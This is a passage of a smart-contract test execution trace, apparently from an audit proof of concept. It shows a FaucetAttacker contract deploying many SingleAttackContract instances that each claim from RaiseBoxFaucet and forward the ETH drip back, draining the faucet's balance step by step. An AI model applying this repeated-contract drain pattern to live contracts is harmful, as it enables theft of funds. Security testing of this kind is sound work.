    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16506699] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 840000000000000000 [8.4e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xEb02b4D82b12b2dF1B62CDb83C6EB166f725a9B2
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 32) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16249315] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16248556] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16212388] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16204730] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 835000000000000000 [8.35e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x650386B96A2F22A9f021aE011d6d6c36474A6ea6
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 33) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15947346] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15946587] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15910419] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15902761] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 830000000000000000 [8.3e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xF18CBF4fc5170A7253e9944194775d881aCd670d
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 34) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15645377] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15644618] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15608450] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15600792] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 825000000000000000 [8.25e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xC1F549Ac934266388149c8Ee1846ace0A3f23Eff
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 35) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15343408] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15342649] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15306481] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15298823] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
